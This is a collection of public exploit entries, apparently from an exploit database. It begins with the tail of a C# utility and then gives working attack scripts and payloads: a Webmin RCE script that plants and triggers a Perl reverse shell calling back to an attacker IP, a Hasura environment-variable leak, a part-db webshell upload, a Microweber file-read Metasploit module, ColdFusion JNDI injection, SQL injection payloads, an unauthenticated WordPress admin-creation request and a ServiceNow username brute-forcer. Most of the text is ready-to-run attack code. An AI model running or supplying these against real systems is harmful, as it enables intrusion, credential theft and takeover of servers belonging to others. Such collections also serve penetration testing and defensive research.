                                linerc++;
                            }
                        }
                    }
                }
            }
            catch (Exception e) { Console.WriteLine("There was an error, try re-running the program. \n" + e); Console.ReadLine(); }

            Thread.Sleep(20);
        }
    }
    public static bool readFileProperties(string file, string filter)
    {
        System.Diagnostics.Process process = new System.Diagnostics.Process();
        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
        startInfo.UseShellExecute = false;
        startInfo.RedirectStandardOutput = true;
        startInfo.FileName = "CMD.exe";
        startInfo.Arguments = "/c PowerShell -Command \"$FilePath='" + file + "'; Write-Host ((New-Object -COMObject Shell.Application).NameSpace((Split-Path -Parent -Path $FilePath))).ParseName((Split-Path -Leaf -Path $FilePath)).ExtendedProperty('System.Author')\"";
        process.StartInfo = startInfo;
        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        if (output.Contains(filter)) { return true; }
        else { return false; }
        //wmic datafile where Name="F:\\ekojs.txt" get Description,Path,Status,Version
    }
}
# Exploit Title: Webmin 1.984 - Remote Code Execution (Authenticated)
# Date: 2022-03-06
# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
# Vendor Homepage: https://www.webmin.com/
# Software Link: https://github.com/webmin/webmin/archive/refs/tags/1.984.zip
# Version: <= 1.984
# Tested on: Ubuntu 18
# Reference: https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell


#!/usr/bin/python3

"""
Coded by: @faisalfs10x
GitHub: https://github.com/faisalfs10x
Reference: https://huntr.dev/bounties/d0049a96-de90-4b1a-9111-94de1044f295/
"""

import requests
import urllib3
import argparse
import os
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TGREEN =  '\033[32m'
TRED =  '\033[31m'
TCYAN =  '\033[36m'
TSHELL =  '\033[32;1m'
ENDC = '\033[m'

class Exploit(object):
    def __init__(self, target, username, password, py3http_server, pyhttp_port, upload_path, callback_ip, callback_port, fname):
        self.target = target
        self.username = username
        self.password = password
        self.py3http_server = py3http_server
        self.pyhttp_port = pyhttp_port
        self.upload_path = upload_path
        self.callback_ip = callback_ip
        self.callback_port = callback_port
        self.fname = fname

        #self.proxies = proxies
        self.s = requests.Session()


    def gen_payload(self):
        payload = ('''perl -e 'use Socket;$i="''' + self.callback_ip  + '''";$p=''' + self.callback_port + ''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};' ''')
        print(TCYAN + f"\n[+] Generating payload to {self.fname} in current directory", ENDC)
        f = open(f"{self.fname}", "w")
        f.write(payload)
        f.close()

    def login(self):
        login_url = self.target + "/session_login.cgi"
        cookies = { "redirect": "1", "testing": "1", "PHPSESSID": "" }

        data = { 'user' : self.username, 'pass' : self.password }
        try:
            r = self.s.post(login_url, data=data, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            success_message = 'System hostname'
            if success_message in r.text:
                print(TGREEN + "[+] Login Successful", ENDC)
            else:
                print(TRED +"[-] Login Failed", ENDC)
                exit()

        except requests.Timeout as e:
            print(TRED + f"[-] Target: {self.target} is not responding, Connection timed out", ENDC)
            exit()

    def pyhttp_server(self):
        print(f'[+] Attempt to host http.server on {self.pyhttp_port}\n')
        os.system(f'(setsid $(which python3) -m http.server {self.pyhttp_port} 0>&1 & ) ') # add 2>/dev/null for clean up
        print('[+] Sleep 3 second to ensure http server is up!')
        time.sleep(3) # Sleep for 3 seconds to ensure http server is up!

    def download_remote_url(self):
        download_url = self.target + "/extensions/file-manager/http_download.cgi?module=filemin"
        headers = {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": self.target + "/filemin/?xnavigation=1"
        }

        data = {
                'link': "http://" + self.py3http_server + "/" + self.fname,
                'username': '',
                'password': '',
                'path': self.upload_path
        }

        r = self.s.post(download_url, data=data, headers=headers, verify=False, allow_redirects=True)
        print(f"\n[+] Fetching {self.fname} from http.server {self.py3http_server}")

    def modify_permission(self):
        modify_perm_url = self.target + "/extensions/file-manager/chmod.cgi?module=filemin&page=1&paginate=30"
        headers = { "Referer": self.target + "/filemin/?xnavigation=1" }
        data = { "name": self.fname, "perms": "0755", "applyto": "1", "path": self.upload_path }
      
        r = self.s.post(modify_perm_url, data=data, headers=headers, verify=False, allow_redirects=True)
        print(f"[+] Modifying permission of {self.fname} to 0755")

    def exec_revshell(self):
        url = self.target + '/' + self.fname
        try:
            r = self.s.get(url, verify=False, allow_redirects=True, timeout=3)
        except requests.Timeout as e: # check target whether make response in 3s, then it indicates shell has been spawned!
            print(TGREEN + f"\n[+] Success: shell spawned to {self.callback_ip} via port {self.callback_port} - XD", ENDC)
            print("[+] Shell location: " + url)
        else:
            print(TRED + f"\n[-] Please setup listener first and try again with: nc -lvp {self.callback_port}", ENDC)

    def do_cleanup(self):
        print(TCYAN + '\n[+] Cleaning up ')
        print(f'[+] Killing: http.server on port {self.pyhttp_port}')
        os.system(f'kill -9 $(lsof -t -i:{self.pyhttp_port})')
        exit()

    def run(self):
        self.gen_payload()
        self.login()
        self.pyhttp_server()
        self.download_remote_url()
        self.modify_permission()
        self.exec_revshell()
        self.do_cleanup()


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Webmin CVE-2022-0824 Reverse Shell')
    parser.add_argument('-t', '--target', type=str, required=True, help=' Target full URL, https://www.webmin.local:10000')
    parser.add_argument('-c', '--credential', type=str, required=True, help=' Format, user:user123')
    parser.add_argument('-LS', '--py3http_server', type=str, required=True, help=' Http server for serving payload, ex 192.168.8.120:8080')
    parser.add_argument('-L', '--callback_ip', type=str, required=True, help=' Callback IP to receive revshell')
    parser.add_argument('-P', '--callback_port', type=str, required=True, help=' Callback port to receive revshell')
    parser.add_argument("-V",'--version', action='version', version='%(prog)s 1.0')
    args = parser.parse_args()

    target = args.target
    username = args.credential.split(':')[0]
    password = args.credential.split(':')[1]
    py3http_server = args.py3http_server
    pyhttp_port = py3http_server.split(':')[1]
    callback_ip = args.callback_ip
    callback_port = args.callback_port
    upload_path = "/usr/share/webmin" # the default installation of Webmin Debian Package, may be in different location if installed using other method.
    fname = "revshell.cgi" # CGI script name, you may change to different name

    pwn = Exploit(target, username, password, py3http_server, pyhttp_port, upload_path, callback_ip, callback_port, fname)
    pwn.run()
# Exploit Title: Hasura GraphQL 2.2.0 - Information Disclosure
# Software: Hasura GraphQL Community
# Software Link: https://github.com/hasura/graphql-engine
# Version: 2.2.0
# Exploit Author: Dolev Farhi
# Date: 5/05/2022
# Tested on: Ubuntu

import requests

SERVER_ADDR = 'x.x.x.x'

url = 'http://{}/v1/metadata'.format(SERVER_ADDR)

print('Hasura GraphQL Community 2.2.0 - Arbitrary Root Environment Variables Read')

while True:
    env_var = input('Type environment variable key to leak.\n> ')
    if not env_var:
        continue

    payload = {
    "type": "bulk",
    "source": "",
    "args": [
        {
            "type": "add_remote_schema",
            "args": {
                "name": "ttt",
                "definition": {
                    "timeout_seconds": 60,
                    "forward_client_headers": False,
                    "headers": [],
                    "url_from_env": env_var
                },
                "comment": ""
            }
        }
    ],
    "resource_version": 2
}
    r = requests.post(url, json=payload)
    try:
       print(r.json()['error'].split('not a valid URI:')[1])
    except IndexError:
        print('Could not parse out VAR, dumping error as is')
        print(r.json().get('error', 'N/A'))
# Exploit Title: part-db 0.5.11 - Remote Code Execution (RCE)
# Google Dork: NA
# Date: 03/04/2022
# Exploit Author: Sunny Mehra @DSKMehra
# Vendor Homepage: https://github.com/part-db/part-db
# Software Link: https://github.com/part-db/part-db
# Version: [ 0.5.11.]
# Tested on: [KALI OS]
# CVE : CVE-2022-0848
#
---------------

#!/bin/bash
host=127.0.0.1/Part-DB-0.5.10 #WEBHOST
#Usage: Change host
#Command: bash exploit.sh
#EXPLOIT BY @DSKMehra
echo "<?php system(id); ?>">POC.phtml  #PHP Shell Code
result=`curl -i -s -X POST -F "logo_file=@POC.phtml" "http://$host/show_part_label.php" | grep -o -P '(?<=value="data/media/labels/).*(?=" > <p)'`
rm POC.phtml
echo Shell Location : "$host/data/media/labels/$result"
# Exploit Title: Microweber CMS v1.2.10 Local File Inclusion (Authenticated)
# Date: 22.02.2022
# Exploit Author: Talha Karakumru <talhakarakumru[at]gmail.com>
# Vendor Homepage: https://microweber.org/
# Software Link: https://github.com/microweber/microweber/archive/refs/tags/v1.2.10.zip
# Version: Microweber CMS v1.2.10
# Tested on: Microweber CMS v1.2.10

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microweber CMS v1.2.10 Local File Inclusion (Authenticated)',
        'Description' => %q{
          Microweber CMS v1.2.10 has a backup functionality. Upload and download endpoints can be combined to read any file from the filesystem.
          Upload function may delete the local file if the web service user has access.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Talha Karakumru <talhakarakumru[at]gmail.com>'
        ],
        'References' => [
          ['URL', 'https://huntr.dev/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b/']
        ],
        'Notes' => {
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ OS_RESOURCE_LOSS ]
        },
        'Targets' => [
          [ 'Microweber v1.2.10', {} ]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2022-01-30'
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Microweber', '/']),
        OptString.new('USERNAME', [true, 'The admin\'s username for Microweber']),
        OptString.new('PASSWORD', [true, 'The admin\'s password for Microweber']),
        OptString.new('LOCAL_FILE_PATH', [true, 'The path of the local file.']),
        OptBool.new('DEFANGED_MODE', [true, 'Run in defanged mode', true])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'admin', 'login')
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Microweber CMS cannot be reached.')
    end

    print_status 'Checking if it\'s Microweber CMS.'

    if res.code == 200 && !res.body.include?('Microweber')
      print_error 'Microweber CMS has not been detected.'
      Exploit::CheckCode::Safe
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    print_good 'Microweber CMS has been detected.'

    return check_version(res.body)
  end

  def check_version(res_body)
    print_status 'Checking Microweber\'s version.'

    begin
      major, minor, build = res_body[/Version:\s+(\d+\.\d+\.\d+)/].gsub(/Version:\s+/, '').split('.')
      version = Rex::Version.new("#{major}.#{minor}.#{build}")
    rescue NoMethodError, TypeError
      return Exploit::CheckCode::Safe
    end

    if version == Rex::Version.new('1.2.10')
      print_good 'Microweber version ' + version.to_s
      return Exploit::CheckCode::Appears
    end

    print_error 'Microweber version ' + version.to_s

    if version < Rex::Version.new('1.2.10')
      print_warning 'The versions that are older than 1.2.10 have not been tested. You can follow the exploitation steps of the official vulnerability report.'
      return Exploit::CheckCode::Unknown
    end

    return Exploit::CheckCode::Safe
  end

  def try_login
    print_status 'Trying to log in.'
    res = send_request_cgi({
      'method' => 'POST',
      'keep_cookies' => true,
      'uri' => normalize_uri(target_uri.path, 'api', 'user_login'),
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        'lang' => '',
        'where_to' => 'admin_content'
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Log in request failed.')
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    json_res = res.get_json_document

    if !json_res['error'].nil? && json_res['error'] == 'Wrong username or password.'
      fail_with(Failure::BadConfig, 'Wrong username or password.')
    end

    if !json_res['success'].nil? && json_res['success'] == 'You are logged in'
      print_good 'You are logged in.'
      return
    end

    fail_with(Failure::Unknown, 'An unknown error occurred.')
  end

  def try_upload
    print_status 'Uploading ' + datastore['LOCAL_FILE_PATH'] + ' to the backup folder.'

    referer = ''
    if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?
      referer = "http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/"
    else
      referer = full_uri
    end

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'upload'),
      'vars_get' => {
        'src' => datastore['LOCAL_FILE_PATH']
      },
      'headers' => {
        'Referer' => referer
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Upload request failed.')
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    if res.headers['Content-Type'] == 'application/json'
      json_res = res.get_json_document

      if json_res['success']
        print_good json_res['success']
        return
      end

      fail_with(Failure::Unknown, res.body)
    end

    fail_with(Failure::BadConfig, 'Either the file cannot be read or the file does not exist.')
  end

  def try_download
    filename = datastore['LOCAL_FILE_PATH'].include?('\\') ? datastore['LOCAL_FILE_PATH'].split('\\')[-1] : datastore['LOCAL_FILE_PATH'].split('/')[-1]
    print_status 'Downloading ' + filename + ' from the backup folder.'

    referer = ''
    if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?
      referer = "http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/"
    else
      referer = full_uri
    end

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'download'),
      'vars_get' => {
        'filename' => filename
      },
      'headers' => {
        'Referer' => referer
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Download request failed.')
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    if res.headers['Content-Type'] == 'application/json'
      json_res = res.get_json_document

      if json_res['error']
        fail_with(Failure::Unknown, json_res['error'])
        return
      end
    end

    print_status res.body
  end

  def run
    if datastore['DEFANGED_MODE']
      warning = <<~EOF
        Triggering this vulnerability may delete the local file if the web service user has the permission.
        If you want to continue, disable the DEFANGED_MODE.
        => set DEFANGED_MODE false
      EOF

      fail_with(Failure::BadConfig, warning)
    end

    try_login
    try_upload
    try_download
  end
end
  # Exploit Title: Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)
# Google Dork: intext:"adobe coldfusion 11"
# Date: 2022-22-02
# Exploit Author: Amel BOUZIANE-LEBLOND (https://twitter.com/amellb)
# Vendor Homepage: https://www.adobe.com/sea/products/coldfusion-family.html
# Version: Adobe Coldfusion (11.0.03.292866)
# Tested on: Microsoft Windows Server & Linux

# Description:
# ColdFusion allows an unauthenticated user to connect to any LDAP server. An attacker can exploit it to achieve remote code execution.
# JNDI attack via the 'verifyldapserver' parameter on the utils.cfc

==================== 1.Setup rogue-jndi Server ====================

https://github.com/veracode-research/rogue-jndi


==================== 2.Preparing the Attack =======================

java -jar target/RogueJndi-1.1.jar --command "touch /tmp/owned" --hostname "attacker_box"

==================== 3.Launch the Attack ==========================


http://REDACTED/CFIDE/wizards/common/utils.cfc?method=verifyldapserver&vserver=LDAP_SERVER&vport=LDAP_PORT&vstart=&vusername=&vpassword=&returnformat=json


curl -i -s -k -X $'GET' \
    -H $'Host: target' \
    --data-binary $'\x0d\x0a\x0d\x0a' \
    $'http://REDACTED//CFIDE/wizards/common/utils.cfc?method=verifyldapserver&vserver=LDAP_SERVER&vport=LDAP_PORT&vstart=&vusername=&vpassword=&returnformat=json'


==================== 4.RCE =======================================

Depend on the target need to compile the rogue-jndi server with JAVA 7 or 8
Can be done by modify the pom.xml as below

<configuration>
<source>7</source>
<target>7</target>
</configuration>
  # Title: Air Cargo Management System v1.0 - SQLi
# Author: nu11secur1ty
# Date: 02.18.2022
# Vendor: https://www.sourcecodester.com/users/tips23
# Software: https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html
# Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/2022/Air-Cargo-Management-System

# Description:
The `ref_code` parameter from Air Cargo Management System v1.0 appears
to be vulnerable to SQL injection attacks.
The payload '+(select
load_file('\\\\c5idmpdvfkqycmiqwv299ljz1q7jvej5mtdg44t.https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html\\hag'))+'
was submitted in the ref_code parameter.
This payload injects a SQL sub-query that calls MySQL's load_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed.
WARNING: If this is in some external domain, or some subdomain
redirection, or internal whatever, this will be extremely dangerous!
Status: CRITICAL


[+] Payloads:

---
Parameter: ref_code (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=trace&ref_code=258044'+(select
load_file('\\\\c5idmpdvfkqycmiqwv299ljz1q7jvej5mtdg44t.https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html\\hag'))+''
AND (SELECT 9012 FROM (SELECT(SLEEP(3)))xEdD) AND 'JVki'='JVki
---
  Exploit Title: Thinfinity VirtualUI  2.5.26.2 - Information Disclosure
Date: 18/01/2022
Exploit Author: Daniel Morales
Vendor: https://www.cybelesoft.com <https://www.cybelesoft.com/>
Software Link: https://www.cybelesoft.com/thinfinity/virtualui/ <https://www.cybelesoft.com/thinfinity/virtualui/>
Version vulnerable: Thinfinity VirtualUI < v2.5.26.2
Tested on: Microsoft Windows
CVE: CVE-2021-46354

How it works
External service interaction arises when it is possible to induce an application to interact with an arbitrary external service. The ability to send requests to other systems can allow the vulnerable server to filtrate the real IP of the webserver or increase the attack surface (it may be used also to filtrate the real IP behind a CDN).

Payload
An example of the HTTP request "https://example.com/cmd <https://example.com/cmd>?
cmd=connect&wscompression=true&destAddr=domain.com <http://domain.com/>
&scraper=fmx&screenWidth=1918&screenHeight=934&fitmode=0&argumentsp=&orientation=0&browserWidth=191
8&browserHeight=872&supportCur=true&id=null&devicePixelRatio=1&isMobile=false&isLandscape=true&supp
ortsFullScreen=true&webapp=false”

Where "domain.com <http://domain.com/>" is the external endpoint to be requested.

Vulnerable versions
It has been tested in VirtualUI version 2.1.28.0, 2.1.32.1 and 2.5.26.2

References
https://github.com/cybelesoft/virtualui/issues/3 <https://github.com/cybelesoft/virtualui/issues/3>
https://www.tenable.com/cve/CVE-2021-46354 <https://www.tenable.com/cve/CVE-2021-46354>
https://twitter.com/danielmofer <https://twitter.com/danielmofer>
  Exploit Title: Thinfinity VirtualUI 2.5.41.0  - IFRAME Injection
Date: 16/12/2021
Exploit Author: Daniel Morales
Vendor: https://www.cybelesoft.com <https://www.cybelesoft.com/>
Software Link: https://www.cybelesoft.com/thinfinity/virtualui/ <https://www.cybelesoft.com/thinfinity/virtualui/>
Version: Thinfinity VirtualUI < v3.0
Tested on: Microsoft Windows
CVE: CVE-2021-45092

How it works
By accessing the following payload (URL) an attacker could iframe any external website (of course, only external endpoints that allows being iframed).

Payload
The vulnerable vector is "https://example.com/lab.html?vpath=//wikipedia.com <https://example.com/lab.html?vpath=//wikipedia.com> " where "vpath=//" is the pointer to the external site to be iframed.

Vulnerable versions
It has been tested in VirtualUI version 2.1.37.2, 2.1.42.2, 2.5.0.0, 2.5.36.1, 2.5.36.2 and 2.5.41.0.

References
https://github.com/cybelesoft/virtualui/issues/2 <https://github.com/cybelesoft/virtualui/issues/2>
https://www.tenable.com/cve/CVE-2021-45092 <https://www.tenable.com/cve/CVE-2021-45092>
https://twitter.com/danielmofer <https://twitter.com/danielmofer>
  # Exploit Title: Microweber 1.2.11 - Remote Code Execution (RCE) (Authenticated)
# Google Dork: NA
# Date: 02/17/2022
# Exploit Author: Chetanya Sharma @AggressiveUser
# Vendor Homepage: https://microweber.org/
# Software Link: https://github.com/microweber/microweber
# Version: 1.2.11
# Tested on: [KALI OS]
# CVE : CVE-2022-0557
# Reference : https://huntr.dev/bounties/660c89af-2de5-41bc-aada-9e4e78142db8/

# Step To Reproduce
- Login using Admin Creds.
- Navigate to User Section then Add/Modify Users
- Change/Add image of profile and Select a Crafted Image file
- Crafted image file Aka A image file which craft with PHP CODES for execution 
- File Extension of Crafted File is PHP7 like "Sample.php7"

- Path of Uploaded Crafted SHELL https://localhost/userfiles/media/default/shell.php7
  # Exploit Title: WordPress Plugin Perfect Survey - 1.5.1 - SQLi (Unauthenticated)
# Date 18.02.2022
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.getperfectsurvey.com/
# Software Link: https://web.archive.org/web/20210817031040/https://downloads.wordpress.org/plugin/perfect-survey.1.5.1.zip
# Version: < 1.5.2
# Tested on: Ubuntu 20.04
# CVE: CVE-2021-24762
# CWE: CWE-89
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24762/README.md

'''
Description:
The Perfect Survey WordPress plugin before 1.5.2 does not validate and escape the question_id GET parameter before
using it in a SQL statement in the get_question AJAX action, allowing unauthenticated users to perform SQL injection.
'''

banner = '''
                                                                                                      
   ___    _     _  ______         ____   ____     ____   ___           ____  _    _  _______  _____    ____ 
 _(___)_ (_)   (_)(______)      _(____) (____)  _(____) (___)        _(____)(_)  (_)(_______)(_____) _(____)
(_)   (_)(_)   (_)(_)__  ______(_) _(_)(_)  (_)(_) _(_)(_)(_) ______(_) _(_)(_)__(_)_   _(_)(_)___  (_) _(_)
(_)    _ (_)   (_)(____)(______) _(_)  (_)  (_)  _(_)     (_)(______) _(_)  (________)_(_)  (_____)_  _(_)   
(_)___(_) (_)_(_) (_)____       (_)___ (_)__(_) (_)___    (_)        (_)___      (_) (_)    (_)___(_)(_)___ 
  (___)    (___)  (______)     (______) (____) (______)   (_)       (______)     (_)(_)      (_____)(______)
                                                                                                            
                                                                                                            
                                [+] Perfect Survey - SQL Injection
                                [@] Developed by Ron Jost (Hacker5preme)

'''
print(banner)

import argparse
from datetime import datetime
import os

# User-Input:
my_parser = argparse.ArgumentParser(description= 'Perfect Survey - SQL-Injection (unauthenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH

print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))
print('[*] Payload for SQL-Injection:')
exploitcode_url = r'sqlmap "http://' + target_ip + ':' + target_port + wp_path + r'wp-admin/admin-ajax.php?action=get_question&question_id=1 *" '
print('    Sqlmap options:')
print('     -a, --all           Retrieve everything')
print('     -b, --banner        Retrieve DBMS banner')
print('     --current-user      Retrieve DBMS current user')
print('     --current-db        Retrieve DBMS current database')
print('     --passwords         Enumerate DBMS users password hashes')
print('     --tables            Enumerate DBMS database tables')
print('     --columns           Enumerate DBMS database table column')
print('     --schema            Enumerate DBMS schema')
print('     --dump              Dump DBMS database table entries')
print('     --dump-all          Dump all DBMS databases tables entries')
retrieve_mode = input('Which sqlmap option should be used to retrieve your information? ')
exploitcode = exploitcode_url +  retrieve_mode + ' --answers="follow=Y" --batch -v 0'
os.system(exploitcode)
print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))
# Title: WordPress Plugin MasterStudy LMS 2.7.5 - Unauthenticated Admin Account Creation
# Date: 16.02.2022
# Author: Numan Türle
# CVE: CVE-2022-0441
# Software Link: https://wordpress.org/plugins/masterstudy-lms-learning-management-system/
# Version: <2.7.6
# https://www.youtube.com/watch?v=SI_O6CHXMZk
# https://gist.github.com/numanturle/4762b497d3b56f1a399ea69aa02522a6
# https://wpscan.com/vulnerability/173c2efe-ee9c-4539-852f-c242b4f728ed


POST /wp-admin/admin-ajax.php?action=stm_lms_register&nonce=[NONCE] HTTP/1.1
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: tr,en;q=0.9,tr-TR;q=0.8,en-US;q=0.7,el;q=0.6,zh-CN;q=0.5,zh;q=0.4
Content-Type: application/json
Content-Length: 339

{"user_login":"USERNAME","user_email":"EMAIL@TLD","user_password":"PASSWORD","user_password_re":"PASSWORD","become_instructor":"","privacy_policy":true,"degree":"","expertize":"","auditory":"","additional":[],"additional_instructors":[],"profile_default_fields_for_register":{"wp_capabilities":{"value":{"administrator":1}}}}   
  # Exploit Title: ServiceNow - Username Enumeration
# Google Dork: NA
# Date: 12 February 2022
# Exploit Author: Victor Hanna (Trustwave SpiderLabs)
# Author Github Page: https://9lyph.github.io/CVE-2021-45901/
# Vendor Homepage: https://www.servicenow.com/
# Software Link: https://docs.servicenow.com/bundle/orlando-servicenow-platform/page/product/mid-server/task/t_DownloadMIDServerFiles.html
# Version: Orlando
# Tested on: MAC OSX
# CVE : CVE-2021-45901

#!/usr/local/bin/python3
# Author: Victor Hanna (SpiderLabs)
# User enumeration script SNOW
# Requires valid 1. JSESSION (anonymous), 2. X-UserToken and 3. CSRF Token

import requests
import re
import urllib.parse
from colorama import init
from colorama import Fore, Back, Style
import sys
import os
import time

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def banner():
    print ("[+]********************************************************************************[+]")
    print ("|   Author : Victor Hanna (9lyph)["+Fore.RED + "SpiderLabs" +Style.RESET_ALL+"]\t\t\t\t\t    |")
    print ("|   Decription: SNOW Username Enumerator                                            |")
    print ("|   Usage : "+sys.argv[0]+"                                                        |")
    print ("|   Prequisite: \'users.txt\' needs to contain list of users                          |")   
    print ("[+]********************************************************************************[+]")

def main():
    os.system('clear')
    banner()
    proxies = {
        "http":"http://127.0.0.1:8080/",
        "https":"http://127.0.0.1:8080/"
    }
    url = "http://<redacted>/"
    try:
        # s = requests.Session()
        # s.verify = False
        r = requests.get(url, timeout=10, verify=False, proxies=proxies)
        JSESSIONID = r.cookies["JSESSIONID"]
        glide_user_route = r.cookies["glide_user_route"]
        startTime = (str(time.time_ns()))
        # print (startTime[:-6])
    except requests.exceptions.Timeout:
        print ("[!] Connection to host timed out !")
        sys.exit(1)
    except requests.exceptions.ProxyError:
        print ("[!] Can't communicate with proxy !")
        sys.exit(1)

    with open ("users.txt", "r") as f:
        usernames = f.readlines()
        print (f"[+] Brute forcing ....")
        for users in usernames:
            url = "http://<redacted>/$pwd_reset.do?sysparm_url=ss_default"
            headers1 = {
                "Host": "<redacted>",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Cookie": "glide_user_route="+glide_user_route+"; JSESSIONID="+JSESSIONID+"; __CJ_g_startTime=\'"+startTime[:-6]+"\'"
                }

            try:
                # s = requests.Session()
                # s.verify = False
                r = requests.get(url, headers=headers1, timeout=20, verify=False, proxies=proxies)
                obj1 = re.findall(r"pwd_csrf_token", r.text)
                obj2 = re.findall(r"fireAll\(\"ck_updated\"", r.text)
                tokenIndex = (r.text.index(obj1[0]))
                startTime2 = (str(time.time_ns()))
                # userTokenIndex = (r.text.index(obj2[0]))
                # userToken = (r.text[userTokenIndex+23 : userTokenIndex+95])
                token = (r.text[tokenIndex+45:tokenIndex+73])
                url = "http://<redacted>/xmlhttp.do"
                headers2 = {
                    "Host": "<redacted>",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Referer": "http://<redacted>/$pwd_reset.do?sysparm_url=ss default",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Content-Length": "786",
                    "Origin": "http://<redacted>/",
                    "Connection": "keep-alive",
                    # "X-UserToken":""+userToken+"",
                    "Cookie": "glide_user_route="+glide_user_route+";JSESSIONID="+JSESSIONID+"; __CJ_g_startTime=\'"+startTime2[:-6]+"\'"
                    }

                data = {
                    "sysparm_processor": "PwdAjaxVerifyIdentity",
                    "sysparm_scope": "global",
                    "sysparm_want_session_messages": "true",
                    "sysparm_name":"verifyIdentity",
                    "sysparm_process_id":"c6b0c20667100200a5a0f3b457415ad5",
                    "sysparm_processor_id_0":"fb9b36b3bf220100710071a7bf07390b",
                    "sysparm_user_id_0":""+users.strip()+"",
                    "sysparm_identification_number":"1",
                    "sysparam_pwd_csrf_token":""+token+"",
                    "ni.nolog.x_referer":"ignore",
                    "x_referer":"$pwd_reset.do?sysparm_url=ss_default"
                    }

                payload_str = urllib.parse.urlencode(data, safe=":+")

            except requests.exceptions.Timeout:
                print ("[!] Connection to host timed out !")
                sys.exit(1)

            try:
                # s = requests.Session()
                # s.verify = False
                time.sleep(2)
                r = requests.post(url, headers=headers2, data=payload_str, timeout=20, verify=False, proxies=proxies)
                if "500" in r.text:
                    print (Fore.RED + f"[-] Invalid user: {users.strip()}" + Style.RESET_ALL)
                    f = open("enumeratedUserList.txt", "a+")
                    f.write(Fore.RED + f"[-] Invalid user: {users.strip()}\n" + Style.RESET_ALL)
                    f.close()
                elif "200" in r.text:
                    print (Fore.GREEN + f"[+] Valid user: {users.strip()}" + Style.RESET_ALL)
                    f = open("enumeratedUserList.txt", "a+")
                    f.write(Fore.GREEN + f"[+] Valid user: {users.strip()}\n" + Style.RESET_ALL)
                    f.close()
                else:
                    print (Fore.RED + f"[-] Invalid user: {users.strip()}" + Style.RESET_ALL)
                    f = open("enumeratedUserList.txt", "a+")
                    f.write(Fore.RED + f"[-] Invalid user: {users.strip()}\n" + Style.RESET_ALL)
                    f.close()
